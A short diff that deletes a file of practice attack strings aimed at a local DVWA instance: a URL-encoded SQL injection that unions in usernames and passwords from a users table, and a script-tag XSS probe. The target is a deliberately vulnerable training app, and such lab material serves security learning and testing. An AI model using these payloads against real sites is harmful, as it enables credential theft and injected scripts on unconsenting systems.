@@ -1,4 +1,0 @@
-////// SQL INJECTION AND XSS ATTACK SCRIPTS 
-
-http://localhost/dvwa/index.php?user=%27UNION%20SELECT%20username,password%20FROM%20users--%22
-http://localhost/dvwa/index.php?search=%3Cscript%3Ealert(1)%3C/script%3E%22
